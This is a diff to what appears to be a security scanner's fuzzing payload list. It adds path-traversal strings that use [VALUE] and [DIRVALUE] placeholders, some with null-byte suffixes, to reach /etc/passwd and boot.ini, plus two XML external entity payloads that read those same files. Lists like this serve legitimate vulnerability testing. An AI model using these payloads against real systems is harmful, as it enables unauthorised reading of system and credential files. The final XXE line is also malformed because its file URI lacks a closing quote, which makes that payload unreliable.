@@ -7,6 +7,14 @@ c:\\boot.ini\0
 ../../../../../../../../../../etc/passwd\0
 ../../../../../../../../../../boot.ini
 ../../../../../../../../../../boot.ini\0
+[VALUE]/../../../../../../../../../../etc/passwd
+[VALUE]/../../../../../../../../../../etc/passwd\0
+[VALUE]/../../../../../../../../../../boot.ini
+[VALUE]/../../../../../../../../../../boot.ini\0
+[DIRVALUE]/../../../../../../../../../../etc/passwd
+[DIRVALUE]/../../../../../../../../../../etc/passwd\0
+[DIRVALUE]/../../../../../../../../../../boot.ini
+[DIRVALUE]/../../../../../../../../../../boot.ini\0
 /etc/passwd\0index.htm
 /etc/passwd\0index.html
 /etc/passwd\0index.php
@@ -31,3 +39,5 @@ c:\\boot.ini\0index.css
 ../../../../../../../../../../boot.ini\0index.asp
 ../../../../../../../../../../boot.ini\0index.aspx
 ../../../../../../../../../../boot.ini\0index.css
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini>]><foo>&xxe;</foo>
